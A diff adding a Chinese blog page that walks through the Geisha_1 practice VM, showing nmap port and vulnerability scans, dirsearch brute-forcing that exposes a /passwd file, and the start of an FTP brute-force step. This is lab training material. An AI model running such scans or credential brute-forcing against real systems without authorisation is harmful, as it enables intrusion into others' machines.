@@ -1,0 +1,710 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Geisha_1 靶机信息收集1234567891011121314151617┌──(kali㉿kali)-[~&#x2F;Downloads&#x2F;Geisha_1]└─$ sudo nmap --min-rate 10000 -p- 192.1.1.145                                                    Starting Nmap 7.94 ( http">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Geisha_1 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/08/9ad2d44c60f1.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="Geisha_1 靶机信息收集1234567891011121314151617┌──(kali㉿kali)-[~&#x2F;Downloads&#x2F;Geisha_1]└─$ sudo nmap --min-rate 10000 -p- 192.1.1.145                                                    Starting Nmap 7.94 ( http">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/022f86227f858f8e0d05b0b9a8a562ac_MD5.png">
+<meta property="article:published_time" content="2023-08-30T02:53:03.000Z">
+<meta property="article:modified_time" content="2023-08-31T01:35:17.882Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/022f86227f858f8e0d05b0b9a8a562ac_MD5.png">
+  
+  
+  
+  <title>Geisha_1 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Geisha_1 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-30 10:53" pubdate>
+          2023年8月30日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          132 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Geisha_1 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Geisha-1-靶机"><a href="#Geisha-1-靶机" class="headerlink" title="Geisha_1 靶机"></a>Geisha_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.145                                                    <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 22:52 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.145<br>Host is up (0.00011s latency).<br>Not shown: 65528 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>22/tcp   open  ssh<br>80/tcp   open  http<br>7080/tcp open  empowerid<br>7125/tcp open  unknown<br>8088/tcp open  radan-http<br>9198/tcp open  unknown<br>MAC Address: 00:0C:29:B4:24:08 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.59 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放端口比较多，兔子洞概率较大</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ sudo nmap -sT -sV -sC -O -p21,22,80,7080,7125,8088,9198 192.1.1.145<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 22:56 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.145<br>Host is up (0.00026s latency).<br><br>PORT     STATE SERVICE  VERSION<br>21/tcp   open  ftp      vsftpd 3.0.3<br>22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 1b:f2:5d:<span class="hljs-built_in">cd</span>:89:13:f2:49:00:9f:8c:f9:eb:a2:a2:0c (RSA)<br>|   256 31:5a:65:2e:ab:0f:59:ab:e0:33:3a:0c:<span class="hljs-built_in">fc</span>:49:e0:5f (ECDSA)<br>|_  256 c6:a7:35:14:96:13:f8:de:1e:e2:bc:e7:c7:66:8b:ac (ED25519)<br>80/tcp   open  http     Apache httpd 2.4.38 ((Debian))<br>|_http-server-header: Apache/2.4.38 (Debian)<br>|_http-title: Geisha<br>7080/tcp open  ssl/http LiteSpeed httpd<br>|_http-server-header: LiteSpeed<br>| ssl-cert: Subject: commonName=geisha/organizationName=webadmin/countryName=US<br>| Not valid before: 2020-05-09T14:01:34<br>|_Not valid after:  2022-05-09T14:01:34<br>| tls-alpn: <br>|   h2<br>|   spdy/3<br>|   spdy/2<br>|_  http/1.1<br>|_http-title: Geisha<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>7125/tcp open  http     nginx 1.17.10<br>|_http-title: Geisha<br>|_http-server-header: nginx/1.17.10<br>8088/tcp open  http     LiteSpeed httpd<br>|_http-server-header: LiteSpeed<br>|_http-title: Geisha<br>9198/tcp open  http     SimpleHTTPServer 0.6 (Python 2.7.16)<br>|_http-server-header: SimpleHTTP/0.6 Python/2.7.16<br>|_http-title: Geisha<br>MAC Address: 00:0C:29:B4:24:08 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 36.05 seconds<br></code></pre></td></tr></table></figure>
+
+<p>信息比较杂乱，先把三板斧走完</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ sudo nmap --script=vuln -p21,22,80,7080,7125,8088,9198 192.1.1.145<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 22:57 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.145<br>Host is up (0.00025s latency).<br><br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /info.php: Possible information file</span><br><span class="hljs-string">7080/tcp open  empowerid</span><br><span class="hljs-string">|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">| http-litespeed-sourcecode-download: </span><br><span class="hljs-string">| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)</span><br><span class="hljs-string">| /index.php source code:</span><br><span class="hljs-string">| &lt;html&gt;&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="hljs-string">| &lt;h2&gt;HTTPS is required&lt;/h2&gt;</span><br><span class="hljs-string">| &lt;p&gt;This is an SSL protected page, please use the HTTPS scheme instead of the plain HTTP scheme to access this URL.&lt;br /&gt;</span><br><span class="hljs-string">| &lt;blockquote&gt;Hint: The URL should starts with &lt;b&gt;https&lt;/b&gt;://&lt;/blockquote&gt; &lt;/p&gt;</span><br><span class="hljs-string">| &lt;hr /&gt;</span><br><span class="hljs-string">| Powered By LiteSpeed Web Server&lt;br /&gt;</span><br><span class="hljs-string">| &lt;a href=&#x27;</span>http://www.litespeedtech.com<span class="hljs-string">&#x27;&gt;&lt;i&gt;http://www.litespeedtech.com&lt;/i&gt;&lt;/a&gt;</span><br><span class="hljs-string">|_&lt;/body&gt;&lt;/html&gt;</span><br><span class="hljs-string">|_http-vuln-cve2013-7091: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">|_http-passwd: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server\&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       http://ha.ckers.org/slowloris/<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>7125/tcp open  unknown<br>8088/tcp open  radan-http<br>| http-enum: <br>|_  /info.php: Possible information file<br>9198/tcp open  unknown<br>MAC Address: 00:0C:29:B4:24:08 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 331.59 seconds<br></code></pre></td></tr></table></figure>
+
+<p>有效信息并不多，汇总一下</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">21 </span>ftp <br><span class="hljs-symbol">22 </span>ssh <br><span class="hljs-symbol">80 </span>Apache <br><span class="hljs-symbol">7080 </span>LiteSpeed<br><span class="hljs-symbol">7125 </span>nginx<br><span class="hljs-symbol">8080 </span>LiteSpeed<br><span class="hljs-symbol">9198 </span>SimpleHTTPServer<br></code></pre></td></tr></table></figure>
+
+<p>先尝试了一下 ftp 匿名登录（其实 nmap 脚本扫描会对 ftp 匿名登录进行检测），失败</p>
+<p>尝试逐个目录爆破，在 7125 端口发现了 <code>/passwd</code> 目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ sudo dirsearch -u http://192.1.1.145:7125  <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.1.1.145-7125/_23-08-30_02-54-18.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-08-30_02-54-18.<span class="hljs-built_in">log</span><br><br>Target: http://192.1.1.145:7125/<br><br>[02:54:18] Starting: <br>[02:54:37] 200 -  175B  - /index.php                                        <br>[02:54:37] 200 -  175B  - /index.php/login/                                 <br>[02:54:42] 200 -    1KB - /passwd<br></code></pre></td></tr></table></figure>
+
+<p>第一反应是有没有可能是文件包含漏洞，尝试了一下并不是，不过访问&#x2F;shadow 时返回结果是 403。passwd 文件内容如下</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span><br><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-title class_">Manager</span><span class="hljs-symbol">:/var/list</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">102</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Time</span> <span class="hljs-title class_">Synchronization</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Resolver</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">geisha:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:geisha</span>,,,<span class="hljs-symbol">:/home/geisha</span><span class="hljs-symbol">:/bin/bash</span><br>systemd-<span class="hljs-symbol">coredump:</span><span class="hljs-symbol">x:</span><span class="hljs-number">999</span><span class="hljs-symbol">:</span><span class="hljs-number">999</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Core</span> <span class="hljs-title class_">Dumper</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">lsadm:</span><span class="hljs-symbol">x:</span><span class="hljs-number">998</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br></code></pre></td></tr></table></figure>
+
+<p>得到了一个用户名 <code>geisha</code> </p>
+<h2 id="FTP-爆破"><a href="#FTP-爆破" class="headerlink" title="FTP 爆破"></a>FTP 爆破</h2><p>尝试 ftp 爆破</p>
